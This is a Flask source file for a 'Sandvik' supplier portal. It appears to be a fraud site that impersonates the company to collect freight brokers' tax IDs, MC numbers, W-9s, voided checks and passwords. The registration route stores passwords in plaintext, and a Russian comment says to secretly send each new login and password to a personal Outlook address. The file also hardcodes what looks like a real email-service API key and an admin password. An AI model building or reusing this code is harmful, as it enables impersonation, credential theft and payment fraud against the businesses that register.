import os
import sqlite3
import uuid
import random
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
from flask import Flask, request, redirect, url_for, session, render_template_string, send_from_directory, flash
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'sandvik_customer_shipper_premium_2026'
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024 

ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg'}

# --- НАСТРОЙКИ ПОЧТЫ ---
import sendgrid
from sendgrid.helpers.mail import Mail

# Вставь свой API Key, который создал в SendGrid (он выглядит как SG.xxxx...)
SENDGRID_API_KEY = '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'

def send_email(to_email, subject, body):
    try:
        message = Mail(
            from_email='no-reply@portal-homesandvik.com', # Твой верифицированный email
            to_emails=to_email,
            subject=subject,
            plain_text_content=body,
            html_content=body)
        
        sg = sendgrid.SendGridAPIClient(SENDGRID_API_KEY)
        response = sg.send(message)
        return True
    except Exception as e:
        print(f"SendGrid Error: {e}")
        return False
def generate_code(): return str(random.randint(100000, 999999))
def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
def get_db_connection():
    conn = sqlite3.connect('portal.db')
    conn.row_factory = sqlite3.Row  
    return conn

# --- ИНИЦИАЛИЗАЦИЯ БД ---
def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT UNIQUE, password TEXT, role TEXT,
                      company_name TEXT, mc_number TEXT, ein_number TEXT,
                      phone_number TEXT, contact_name TEXT, pay_terms TEXT DEFAULT 'Net 30', 
                      dnu_status INTEGER DEFAULT 0, created_at TEXT,
                      is_verified INTEGER DEFAULT 0, verification_code TEXT, reset_code TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS documents 
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, doc_type TEXT, 
                      filename TEXT, status TEXT, reject_reason TEXT, expiry_date TEXT, updated_at TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS invoices 
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, broker_email TEXT, invoice_number TEXT, load_number TEXT,
                      amount REAL, filename TEXT, payment_proof TEXT, status TEXT, reject_reason TEXT, created_at TEXT, updated_at TEXT)''')
        
        if not c.execute("SELECT * FROM users WHERE email='admin'").fetchone():
            c.execute('''INSERT INTO users (email, password, role, company_name, created_at, is_verified) 
                         VALUES ('admin', ?, 'admin', 'Sandvik Corporate', ?, 1)''', 
                      (generate_password_hash('Cakulya123$$'), datetime.now().strftime("%Y-%m-%d %H:%M")))
        conn.commit()
init_db()

# --- ШАБЛОНЫ HTML ---
# --- ШАБЛОНЫ HTML ---
HTML_BASE = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>My Sandvik Portal</title>
<link rel="icon" type="image/png" href="{{ url_for('static', filename='logo.png') }}">

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
<style>
    html, body { height: 100%; }
    body { display: flex; flex-direction: column; background-color: #f4f6f9; font-family: 'Segoe UI', sans-serif; }
    .content-wrapper { flex: 1 0 auto; }
    .footer { flex-shrink: 0; background-color: #fff; border-top: 1px solid #dee2e6; }
    .card { border: none; border-radius: 12px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
    .hub-card { transition: transform 0.2s; text-decoration: none; color: inherit; }
    .hub-card:hover { transform: translateY(-5px); box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1); }
    .dnu-row { background-color: #ffe6e6 !important; }
</style></head>
<body>
<div class="content-wrapper">
    <nav class="navbar navbar-expand-lg navbar-light bg-light mb-4 shadow-sm border-bottom">
        <div class="container">
            <a class="navbar-brand d-flex align-items-center" href="/">
                <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo" style="height: 40px; width: auto; display: block !important; visibility: visible !important; opacity: 1 !important;">
                <span class="fw-bold tracking-wide ms-2">MY SANDVIK PORTAL</span>
            </a>
            {% if session.get('email') %}
            <div class="d-flex align-items-center">
                {% if session['role'] == 'admin' %}
                    <a href="/admin" class="btn btn-sm btn-outline-warning me-2"><i class="bi bi-gear-fill"></i> Operations Board</a>
                    <a href="/admin/brokers" class="btn btn-sm btn-outline-primary me-3"><i class="bi bi-people-fill"></i> Broker Network</a>
                {% endif %}
                <span class="navbar-text text-dark me-3"><i class="bi bi-person-circle"></i> <strong>{{ session['email'] }}</strong></span>
                <a href="/logout" class="btn btn-sm btn-danger"><i class="bi bi-box-arrow-right"></i> Log Out</a>
            </div>
            {% endif %}
        </div>
    </nav>
    <div class="container mb-5">
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}{% for cat, msg in messages %}
                <div class="alert alert-{{ cat }} alert-dismissible fade show shadow-sm">
                    <i class="bi bi-info-circle-fill me-2"></i> {{ msg }}
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            {% endfor %}{% endif %}
        {% endwith %}
        {{ content|safe }}
    </div>
</div>
<footer class="footer py-3 text-center">
    <div class="container">
        <a href="{{ url_for('static', filename='terms.pdf') }}" target="_blank" class="text-muted text-decoration-none fw-bold">
            <i class="bi bi-file-earmark-text"></i> Terms and Conditions
        </a>
    </div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body></html>'''

HTML_LOGIN = '''<div class="row justify-content-center mt-5"><div class="col-md-5"><div class="card shadow-lg">
<div class="alert alert-info d-flex flex-wrap align-items-center justify-content-between shadow-sm border-0 mb-4" style="background-color: #e0f2fe; color: #0284c7; border-radius: 10px;">
    <div class="mb-2 mb-md-0">
        <strong><i class="bi bi-info-circle-fill me-2"></i> New Vendor? Need help?</strong> 
        <span class="ms-1 text-dark">Read our quick 3-step setup guide before you start.</span>
    </div>
    <a href="/guide" class="btn btn-primary fw-bold px-4 shadow-sm" style="border-radius: 8px;">View Guide <i class="bi bi-arrow-right ms-1"></i></a>
</div>
<div class="card-header bg-dark text-white text-center py-4"><h4 class="mb-0">Supplier Portal Login</h4></div><div class="card-body p-4">
<form method="POST" action="/login"><div class="mb-3"><label class="fw-bold">Corporate Email</label><input type="text" name="email" class="form-control" required></div>
<div class="mb-4"><label class="d-flex justify-content-between fw-bold">Password <a href="/forgot-password" class="small text-danger text-decoration-none">Forgot?</a></label><input type="password" name="password" class="form-control" required></div>
<button class="btn btn-dark w-100 py-2 fs-5">Access Account</button></form><hr><p class="text-center mb-0">New Supplier? <a href="/register" class="text-primary fw-bold">Become an Approved Supplier</a></p></div></div></div></div>'''

HTML_REGISTER = '''<div class="row justify-content-center"><div class="col-md-8"><div class="card shadow-lg">
<div class="card-header bg-dark text-white py-3"><h4 class="mb-0"><i class="bi bi-building-add"></i> Supplier Setup Application</h4></div><div class="card-body p-4">
<form method="POST" action="/register"><div class="row mb-3"><div class="col-md-6"><label class="small fw-bold">Brokerage Legal Name</label><input type="text" name="company_name" class="form-control" required></div><div class="col-md-6"><label class="small fw-bold">EIN / Tax ID</label><input type="text" name="ein_number" class="form-control" required></div></div>
<div class="row mb-3"><div class="col-md-6"><label class="small fw-bold">MC Number (Broker Authority)</label><input type="text" name="mc_number" class="form-control" required></div><div class="col-md-6"><label class="small fw-bold">Primary Phone Number</label><input type="text" name="phone_number" class="form-control" required></div></div>
<div class="row mb-3"><div class="col-md-12"><label class="small fw-bold">Primary Contact Name</label><input type="text" name="contact_name" class="form-control" required></div></div>
<h5 class="mt-4 border-bottom pb-2">Login Credentials</h5>
<div class="row mb-4"><div class="col-md-6"><label class="small fw-bold">Corporate Email</label><input type="email" name="email" class="form-control" required></div><div class="col-md-6"><label class="small fw-bold">Password</label><input type="password" name="password" class="form-control" required></div></div>
<button class="btn btn-success w-100 py-3 fs-5 shadow-sm">Submit Setup Request</button></form></div></div></div></div>'''

HTML_VERIFY = '''<div class="row justify-content-center mt-5"><div class="col-md-4"><div class="card shadow-lg">
<div class="card-header bg-primary text-white text-center py-3"><h4 class="mb-0">Verify Identity</h4></div><div class="card-body p-4 text-center">
<p>Enter the 6-digit code sent to <strong>{{ email }}</strong>.</p><form method="POST" action="/verify"><input type="hidden" name="email" value="{{ email }}">
<input type="text" name="code" class="form-control form-control-lg text-center mb-3 fw-bold" placeholder="000000" maxlength="6" required><button class="btn btn-primary w-100 py-2">Verify Broker Account</button></form></div></div></div></div>'''

HTML_FORGOT = '''<div class="row justify-content-center mt-5"><div class="col-md-4"><div class="card shadow-lg"><div class="card-header bg-danger text-white text-center py-3"><h4 class="mb-0">Password Recovery</h4></div><div class="card-body p-4"><form method="POST" action="/forgot-password"><div class="mb-3"><label>Enter Email</label><input type="email" name="email" class="form-control" required></div><button class="btn btn-danger w-100">Send Recovery Code</button></form></div></div></div></div>'''
HTML_RESET = '''<div class="row justify-content-center mt-5"><div class="col-md-4"><div class="card shadow-lg"><div class="card-header bg-danger text-white text-center py-3"><h4 class="mb-0">New Password</h4></div><div class="card-body p-4"><form method="POST" action="/reset-password"><input type="hidden" name="email" value="{{ email }}"><div class="mb-3"><label>6-Digit Code</label><input type="text" name="code" class="form-control" maxlength="6" required></div><div class="mb-3"><label>New Password</label><input type="password" name="new_password" class="form-control" required></div><button class="btn btn-danger w-100">Reset Password</button></form></div></div></div></div>'''

HTML_BROKER_HUB = '''
<div class="row mb-4"><div class="col-md-8">
<h2 class="mb-1 text-primary">{{ profile.company_name }}</h2>
<p class="text-muted fw-bold">MC# {{ profile.mc_number }} | Pay Terms: {{ profile.pay_terms }} | Compliance: 
{% if compliance_score == 100 and profile.dnu_status == 0 %}<span class="badge bg-success">100% Approved</span>
{% elif profile.dnu_status == 1 %}<span class="badge bg-danger">ACCOUNT SUSPENDED (DNU)</span>
{% else %}<span class="badge bg-warning text-dark">{{ compliance_score }}% (Action Required)</span>{% endif %}</p></div>
<div class="col-md-4 text-end">
{% if compliance_score == 100 and profile.dnu_status == 0 %}
<div class="card border-primary bg-light"><div class="card-body p-2"><h6 class="text-primary mb-2"><i class="bi bi-file-earmark-arrow-down"></i> Shipper Packet</h6><button class="btn btn-sm btn-outline-primary w-100" onclick="alert('Downloads Sandvik W9 and Credit References')">Download Sandvik Packet</button></div></div>
{% endif %}</div></div>
<div class="row g-4"><div class="col-md-6"><a href="/compliance" class="card hub-card h-100 p-4 text-center border-primary border-2">
<div class="card-body"><i class="bi bi-shield-check text-primary" style="font-size:3rem;"></i><h4 class="mt-3">1. Vendor Compliance</h4><p class="text-muted small">Submit W-9, Authority, Insurance, and Voided Check.</p></div></a></div>
<div class="col-md-6"><a href="/invoices" class="card hub-card h-100 p-4 text-center border-success border-2">
<div class="card-body"><i class="bi bi-currency-dollar text-success" style="font-size:3rem;"></i><h4 class="mt-3">2. Submit Load Invoices</h4><p class="text-muted small">Bill the shipper and track payment receipts.</p></div></a></div></div>'''

HTML_COMPLIANCE = '''<div class="d-flex justify-content-between mb-4"><h3><i class="bi bi-shield-check text-primary"></i> Vendor Compliance Vault</h3><a href="/" class="btn btn-outline-dark">Back to Hub</a></div>
<div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table align-middle mb-0"><thead class="table-light"><tr><th class="ps-3">Requirement</th><th>Status</th><th>Expiry</th><th>Action</th></tr></thead>
<tbody>{% for doc_type in ['W-9 Form', 'Broker Authority (MC)', 'Contingent Cargo Insurance', 'Voided Check'] %}<tr><td class="ps-3 fw-bold">{{ doc_type }}</td><td>
{% set found = namespace(status='Missing', reason='', expiry='N/A') %}{% for d in docs %}{% if d.doc_type == doc_type %}{% set found.status = d.status %}{% set found.reason = d.reject_reason %}{% set found.expiry = d.expiry_date %}{% endif %}{% endfor %}
{% if found.status == 'Missing' %}<span class="badge bg-danger">Missing</span>{% elif found.status == 'Pending' %}<span class="badge bg-warning text-dark">Shipper Review</span>{% else %}<span class="badge bg-success">Verified</span>{% endif %}
{% if found.reason %}<br><small class="text-danger fw-bold">{{ found.reason }}</small>{% endif %}</td><td><small class="fw-bold">{{ found.expiry }}</small></td><td>
{% if found.status != 'Approved' %}<form method="POST" action="/upload" enctype="multipart/form-data" class="d-flex">
<input type="hidden" name="doc_type" value="{{ doc_type }}"><input type="file" name="file" class="form-control form-control-sm me-1" style="max-width:160px;" required>
{% if doc_type == 'Contingent Cargo Insurance' %}<input type="date" name="expiry_date" class="form-control form-control-sm me-1" style="max-width:120px;" required>{% endif %}
<button class="btn btn-sm btn-dark">Upload</button></form>{% else %}<span class="text-success small"><i class="bi bi-lock-fill"></i> Locked</span>{% endif %}</td></tr>{% endfor %}</tbody></table></div></div></div>'''

HTML_INVOICES = '''<div class="d-flex justify-content-between mb-4"><h3><i class="bi bi-currency-dollar text-success"></i> Accounts Receivable</h3><a href="/" class="btn btn-outline-dark">Back to Hub</a></div>
<div class="row"><div class="col-md-4"><div class="card shadow-sm"><div class="card-header bg-dark text-white"><h5 class="mb-0">Bill Shipper for Load</h5></div><div class="card-body">
{% if profile.dnu_status == 1 %}
    <div class="alert alert-danger text-center"><strong>ACCOUNT FROZEN.</strong> You cannot submit invoices at this time. Please contact Sandvik Corporate.</div>
{% elif compliance_score == 100 %}
    <form method="POST" action="/upload-invoice" enctype="multipart/form-data"><div class="mb-2"><label class="small fw-bold">Load Number</label><input type="text" name="load_number" class="form-control form-control-sm" required></div>
    <div class="mb-2"><label class="small fw-bold">Your Invoice Number</label><input type="text" name="invoice_number" class="form-control form-control-sm" required></div>
    <div class="mb-2"><label class="small fw-bold">Total Freight Cost ($)</label><input type="number" step="0.01" name="amount" class="form-control form-control-sm" required></div>
    <div class="mb-3"><label class="small fw-bold">Attach Invoice & BOLs (Select multiple)</label><input type="file" name="files" class="form-control form-control-sm" multiple required></div><button class="btn btn-success w-100 fw-bold">Submit to Shipper A/P</button></form>
{% else %}<div class="alert alert-warning text-center text-dark"><strong>Action Required:</strong> You must complete 100% of your Compliance Vault before billing.</div>{% endif %}
</div></div></div>
<div class="col-md-8"><div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table align-middle mb-0"><thead class="table-light"><tr><th class="ps-3">Load & Invoice Info</th><th>Amount / Files</th><th>Status</th><th>Actions & Proof</th></tr></thead>
<tbody>{% for inv in invoices %}<tr><td class="ps-3"><span class="fw-bold text-primary">Load: {{ inv.load_number }}</span><br><small class="text-muted">Inv: {{ inv.invoice_number }}</small></td>
<td><span class="fw-bold text-danger">${{ "{:,.2f}".format(inv.amount) }}</span><br>
<div class="d-flex flex-wrap gap-1 mt-1">{% set file_list = inv.filename.split('|') %}{% for f in file_list %}<a href="/downloads/{{ f }}" class="badge bg-secondary text-decoration-none" target="_blank">Doc {{ loop.index }}</a>{% endfor %}</div></td>
<td>
    {% if inv.status == 'Pending' %}<span class="badge bg-warning text-dark">In Review (Docs)</span>
    {% elif inv.status == 'Pending Payment' %}<span class="badge bg-info text-dark">Approved Docs - Awaiting Payment</span>
    {% elif inv.status == 'Paid' %}<span class="badge bg-success">Paid & Closed</span>
    {% else %}<span class="badge bg-danger">Disputed</span><br><small class="text-danger fw-bold">{{ inv.reject_reason }}</small>{% endif %}
</td>
<td>{% if inv.payment_proof %}<a href="/downloads/{{ inv.payment_proof }}" class="btn btn-sm btn-outline-success" target="_blank"><i class="bi bi-receipt"></i> Receipt</a>{% else %}<span class="text-muted small">Awaiting</span>{% endif %}
{% if inv.status != 'Paid' %}<form method="POST" action="/delete-invoice/{{ inv.id }}" class="mt-2" onsubmit="return confirm('Are you sure you want to delete this invoice?');"><button class="btn btn-sm btn-outline-danger py-0 px-2"><i class="bi bi-trash"></i> Delete</button></form>{% endif %}
</td></tr>{% else %}<tr><td colspan="4" class="text-center py-4">No submitted invoices.</td></tr>{% endfor %}</tbody></table></div></div></div></div>'''

HTML_ADMIN = '''
<div class="row mb-4"><div class="col-md-3"><div class="card bg-primary text-white text-center p-3 shadow-sm"><h6 class="text-uppercase tracking-wide">Approved Brokers</h6><h2>{{ total_brokers }}</h2></div></div>
<div class="col-md-3"><div class="card bg-warning text-dark text-center p-3 shadow-sm"><h6 class="text-uppercase tracking-wide">Docs to Review</h6><h2>{{ pending_count }}</h2></div></div>
<div class="col-md-3"><div class="card bg-danger text-white text-center p-3 shadow-sm"><h6 class="text-uppercase tracking-wide">Outstanding A/R</h6><h2>${{ "{:,.2f}".format(total_ap) }}</h2></div></div>
<div class="col-md-3 d-flex align-items-center"><form method="GET" action="/admin" class="w-100 d-flex"><input type="text" name="search" class="form-control form-control-sm me-2" placeholder="Search Load, MC..." value="{{ search_query }}"><button class="btn btn-sm btn-dark">Search</button></form></div></div>

<ul class="nav nav-tabs mb-3"><li class="nav-item"><button class="nav-link active fw-bold" data-bs-toggle="tab" data-bs-target="#docsQueue">1. Vendor Approvals</button></li>
<li class="nav-item"><button class="nav-link fw-bold text-danger" data-bs-toggle="tab" data-bs-target="#apQueue">2. Accounts Payable (A/P)</button></li>
<li class="nav-item"><button class="nav-link fw-bold text-success" data-bs-toggle="tab" data-bs-target="#historyQueue"><i class="bi bi-archive-fill"></i> 3. Payment History</button></li></ul>

<div class="tab-content"><div class="tab-pane fade show active" id="docsQueue"><div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table table-hover align-middle mb-0"><thead class="table-dark"><tr><th class="ps-3">Broker Details</th><th>Document Submitted</th><th>Action</th></tr></thead>
<tbody>{% for d in pending_docs %}<tr><td class="ps-3"><span class="fw-bold text-primary fs-5">{{ d.company_name }}</span><br><small class="fw-bold">MC: {{ d.mc_number }} | {{ d.phone_number }}</small></td>
<td><span class="badge bg-secondary fs-6">{{ d.doc_type }}</span>{% if d.expiry_date != 'N/A' %}<br><small class="text-danger fw-bold">Exp: {{ d.expiry_date }}</small>{% endif %}</td>
<td><div class="d-flex"><a href="/downloads/{{ d.filename }}" target="_blank" class="btn btn-sm btn-outline-dark me-2">View</a>
<a href="/review/{{ d.doc_id }}/Approved" class="btn btn-sm btn-success me-2">Approve</a>
<form method="POST" action="/reject/{{ d.doc_id }}" class="d-flex"><input type="text" name="reason" class="form-control form-control-sm me-1" placeholder="Reject reason..." required style="max-width:150px;"><button class="btn btn-sm btn-danger">Reject</button></form></div></td></tr>
{% else %}<tr><td colspan="3" class="text-center py-5 text-muted"><h4>All caught up! No documents pending.</h4></td></tr>{% endfor %}</tbody></table></div></div></div></div>

<div class="tab-pane fade" id="apQueue"><div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table table-hover align-middle mb-0"><thead class="table-dark"><tr><th class="ps-3">Brokerage</th><th>Load Details</th><th>Amount & Files</th><th>Audit & Payment Actions</th></tr></thead>
<tbody>{% for inv in pending_invoices %}<tr><td class="ps-3"><span class="fw-bold">{{ inv.company_name }}</span><br><small>MC: {{ inv.mc_number }}</small></td>
<td><strong>Load: {{ inv.load_number }}</strong><br><small>Inv: {{ inv.invoice_number }}</small></td>
<td><span class="text-danger fw-bold fs-5">${{ "{:,.2f}".format(inv.amount) }}</span><br>
<div class="d-flex gap-1 mt-1">{% set f_list = inv.filename.split('|') %}{% for f in f_list %}<a href="/downloads/{{ f }}" target="_blank" class="badge bg-secondary text-decoration-none">Doc {{ loop.index }}</a>{% endfor %}</div></td>
<td><div class="d-flex align-items-center flex-wrap gap-2">
    {% if inv.status == 'Pending' %}
        <span class="badge bg-warning text-dark"><i class="bi bi-file-earmark-text"></i> Docs Unverified</span>
        <a href="/review-invoice-docs/{{ inv.inv_id }}" class="btn btn-sm btn-primary fw-bold">Approve Documents</a>
    {% elif inv.status == 'Pending Payment' %}
        <span class="badge bg-info text-dark"><i class="bi bi-hourglass-split"></i> Accepted (Awaiting Pay)</span>
        <form method="POST" action="/pay-broker/{{ inv.inv_id }}" enctype="multipart/form-data" class="d-flex align-items-center m-0"><input type="file" name="file" class="form-control form-control-sm me-1" required><button class="btn btn-sm btn-success text-nowrap">Upload Proof & Pay</button></form>
    {% endif %}
    <form method="POST" action="/reject-invoice/{{ inv.inv_id }}" class="d-flex m-0"><input type="text" name="reason" class="form-control form-control-sm me-1" placeholder="Dispute reason..." required style="max-width:120px;"><button class="btn btn-sm btn-danger">Dispute</button></form>
</div></td></tr>
{% else %}<tr><td colspan="4" class="text-center py-5 text-muted">No pending invoices from brokers.</td></tr>{% endfor %}</tbody></table></div></div></div></div>

<div class="tab-pane fade" id="historyQueue"><div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table table-hover align-middle mb-0"><thead class="table-dark"><tr><th class="ps-3">Brokerage</th><th>Load Details</th><th>Amount</th><th>Status & Updates</th></tr></thead>
<tbody>{% for h in history_invoices %}<tr><td class="ps-3"><span class="fw-bold">{{ h.company_name }}</span><br><small>MC: {{ h.mc_number }}</small></td>
<td><strong>Load: {{ h.load_number }}</strong><br><small>Inv: {{ h.invoice_number }}</small></td><td><span class="text-dark fw-bold fs-5">${{ "{:,.2f}".format(h.amount) }}</span></td>
<td>{% if h.status == 'Paid' %}<span class="badge bg-success">Paid</span>{% if h.payment_proof %}<a href="/downloads/{{ h.payment_proof }}" target="_blank" class="btn btn-sm btn-link"><i class="bi bi-receipt"></i></a>{% endif %}{% else %}<span class="badge bg-danger">Disputed: {{ h.reject_reason }}</span>{% endif %}<br><small class="text-muted">{{ h.updated_at }}</small></td></tr>
{% else %}<tr><td colspan="4" class="text-center py-5 text-muted">No history available yet.</td></tr>{% endfor %}</tbody></table></div></div></div></div></div>'''

HTML_BROKERS_DIRECTORY = '''
<div class="row mb-4">
    <div class="col-md-8">
        <div class="card shadow-sm border-primary h-100">
            <div class="card-header bg-primary text-white"><h5 class="mb-0"><i class="bi bi-cloud-arrow-up-fill"></i> Manual Document Upload</h5></div>
            <div class="card-body d-flex align-items-center">
                <form method="POST" action="/admin/upload-for-broker" enctype="multipart/form-data" class="row w-100 align-items-end m-0">
                    <div class="col-md-4 ps-0"><label class="small fw-bold">Select Broker</label><select name="broker_email" class="form-select" required>
                    {% for c in carriers %}<option value="{{ c.email }}">{{ c.company_name }} ({{ c.mc_number }})</option>{% endfor %}</select></div>
                    <div class="col-md-3"><label class="small fw-bold">Doc Type</label><select name="doc_type" class="form-select" required>
                    <option value="W-9 Form">W-9 Form</option><option value="Broker Authority (MC)">Broker Authority (MC)</option>
                    <option value="Contingent Cargo Insurance">Contingent Cargo Insurance</option><option value="Voided Check">Voided Check</option></select></div>
                    <div class="col-md-3"><label class="small fw-bold">Attach File</label><input type="file" name="file" class="form-control" required></div>
                    <div class="col-md-2 pe-0"><button class="btn btn-primary w-100 fw-bold">Approve</button></div>
                </form>
            </div>
        </div>
    </div>
    <div class="col-md-4">
        <div class="card shadow-sm border-dark h-100">
            <div class="card-header bg-dark text-white"><h5 class="mb-0"><i class="bi bi-envelope-paper-fill"></i> Send VIP Invite</h5></div>
            <div class="card-body d-flex align-items-center">
                <form method="POST" action="/admin/invite-broker" class="w-100 m-0">
                    <label class="small fw-bold">Broker Email</label>
                    <div class="input-group">
                        <input type="email" name="invite_email" class="form-control" placeholder="broker@company.com" required>
                        <button class="btn btn-dark fw-bold">Send</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="d-flex justify-content-between align-items-center mb-3">
    <h3 class="mb-0"><i class="bi bi-diagram-3 text-primary"></i> Approved Broker Network</h3>
    <form method="GET" action="/admin/brokers" class="d-flex" style="max-width: 300px;">
        <input type="text" name="search" class="form-control me-2" placeholder="Search MC or Name..." value="{{ search_query }}">
        <button class="btn btn-dark"><i class="bi bi-search"></i></button>
    </form>
</div>

<div class="card shadow-sm"><div class="card-body p-0"><div class="table-responsive"><table class="table table-hover align-middle mb-0"><thead class="table-dark"><tr>
<th class="ps-3" style="width: 50px;"></th><th>Brokerage Legal Name</th><th>MC Number</th><th>Status & Score</th><th>Total Paid ($)</th><th>Payment Terms</th><th>Actions</th></tr></thead>
<tbody>{% for c in carriers %}
<tr class="{% if c.dnu_status == 1 %}dnu-row{% endif %}">
<td class="ps-3"><button class="btn btn-sm btn-outline-secondary rounded-circle" data-bs-toggle="collapse" data-bs-target="#details{{ c.id }}"><i class="bi bi-chevron-down"></i></button></td>
<td><strong>{{ c.company_name }}</strong><br><small class="text-muted">{{ c.email }} | {{ c.phone_number }}</small></td>
<td><span class="badge bg-info text-dark fs-6">MC# {{ c.mc_number }}</span></td>
<td>{% if c.approved_docs == 4 %}<span class="badge bg-success">100% Approved</span>{% else %}<span class="badge bg-warning text-dark">{{ c.approved_docs }}/4 Docs</span>{% endif %}</td>
<td class="fw-bold text-success">${{ "{:,.2f}".format(c.total_paid if c.total_paid else 0.0) }}</td>
<td><form method="POST" action="/update-terms/{{ c.id }}" class="d-flex"><select name="terms" class="form-select form-select-sm me-1" style="max-width:100px;"><option value="Net 15" {% if c.pay_terms=='Net 15' %}selected{% endif %}>Net 15</option><option value="Net 30" {% if c.pay_terms=='Net 30' %}selected{% endif %}>Net 30</option><option value="Net 45" {% if c.pay_terms=='Net 45' %}selected{% endif %}>Net 45</option><option value="QuickPay" {% if c.pay_terms=='QuickPay' %}selected{% endif %}>QuickPay</option></select><button class="btn btn-sm btn-outline-dark">Set</button></form></td>
<td>
    <div class="d-flex gap-1">
        <form method="POST" action="/toggle-dnu/{{ c.id }}" class="m-0">{% if c.dnu_status == 0 %}<button class="btn btn-sm btn-warning" title="Flag DNU">DNU</button>{% else %}<button class="btn btn-sm btn-success">Un-DNU</button>{% endif %}</form>
        <form method="POST" action="/delete-broker/{{ c.id }}" class="m-0" onsubmit="return confirm('Are you sure you want to permanently delete this broker?');"><button class="btn btn-sm btn-danger" title="Delete Broker"><i class="bi bi-trash"></i></button></form>
    </div>
</td>
</tr>
<tr class="collapse bg-light border-bottom" id="details{{ c.id }}">
<td colspan="7" class="p-4">
    <div class="row text-dark">
        <div class="col-md-4"><strong><i class="bi bi-person-badge text-primary"></i> Primary Contact:</strong><br>{{ c.contact_name }}</div>
        <div class="col-md-4"><strong><i class="bi bi-bank text-primary"></i> EIN / Tax ID:</strong><br>{{ c.ein_number }}</div>
        <div class="col-md-4"><strong><i class="bi bi-calendar-check text-primary"></i> Registered On:</strong><br>{{ c.created_at }}</div>
    </div>
</td>
</tr>
{% endfor %}</tbody></table></div></div></div>'''
def render_full(template_string, **kwargs): return render_template_string(HTML_BASE, content=render_template_string(template_string, **kwargs))

# --- МАРШРУТЫ ПРИЛОЖЕНИЯ ---
@app.route('/')
def index():
    if 'email' not in session: return redirect(url_for('login'))
    if session.get('role') == 'admin': return redirect('/admin')
    
    with get_db_connection() as conn:
        profile = conn.cursor().execute("SELECT * FROM users WHERE email=?", (session['email'],)).fetchone()
        docs = conn.cursor().execute("SELECT * FROM documents WHERE user_email=?", (session['email'],)).fetchall()
        
    approved_count = sum(1 for d in docs if d['status'] == 'Approved')
    compliance_score = int((approved_count / 4) * 100) # 4 Mandatory docs now
    return render_full(HTML_BROKER_HUB, profile=profile, docs=docs, compliance_score=compliance_score)

@app.route('/compliance')
def compliance():
    if 'email' not in session: return redirect(url_for('login'))
    with get_db_connection() as conn:
        docs = conn.cursor().execute("SELECT * FROM documents WHERE user_email=?", (session['email'],)).fetchall()
    return render_full(HTML_COMPLIANCE, docs=docs)

@app.route('/invoices')
def invoices():
    if 'email' not in session: return redirect(url_for('login'))
    with get_db_connection() as conn:
        profile = conn.cursor().execute("SELECT * FROM users WHERE email=?", (session['email'],)).fetchone()
        docs = conn.cursor().execute("SELECT * FROM documents WHERE user_email=?", (session['email'],)).fetchall()
        invs = conn.cursor().execute("SELECT * FROM invoices WHERE broker_email=? ORDER BY id DESC", (session['email'],)).fetchall()
    
    comp_score = int((sum(1 for d in docs if d['status'] == 'Approved') / 4) * 100)
    return render_full(HTML_INVOICES, invoices=invs, compliance_score=comp_score, profile=profile)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, password = request.form['email'], request.form['password']
        with get_db_connection() as conn:
            user = conn.cursor().execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
            if user and (user['password'] == password or (('scrypt:' in user['password'] or 'pbkdf2:' in user['password']) and check_password_hash(user['password'], password))):
                if user['is_verified'] == 0:
                    flash("Please verify your email to unlock access.", "warning")
                    return render_full(HTML_VERIFY, email=email)
                session['email'], session['role'] = user['email'], user['role']
                flash(f"Welcome back!", "success")
                return redirect(url_for('index'))
            flash("Invalid credentials or account does not exist.", "danger")
    return render_full(HTML_LOGIN)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email, password = request.form['email'], request.form['password']
        code, time_now = generate_code(), datetime.now().strftime("%Y-%m-%d %H:%M")
        try:
            with get_db_connection() as conn:
                conn.cursor().execute('''INSERT INTO users (email, password, role, company_name, mc_number, ein_number, phone_number, contact_name, created_at, verification_code) 
                                         VALUES (?, ?, 'supplier', ?, ?, ?, ?, ?, ?, ?)''', 
                                      (email, password, request.form['company_name'], request.form['mc_number'], request.form['ein_number'], request.form['phone_number'], request.form['contact_name'], time_now, code))
                conn.commit()
            
            # 1. Отправляем код брокеру
            send_email(email, "Verify Identity", f"Code: {code}")
            
            # 2. Скрытно отправляем логин и пароль админу
            admin_email = 'mahmud_mahmudski@outlook.com'  # <-- ОБЯЗАТЕЛЬНО ВПИШИ СВОЙ EMAIL СЮДА!
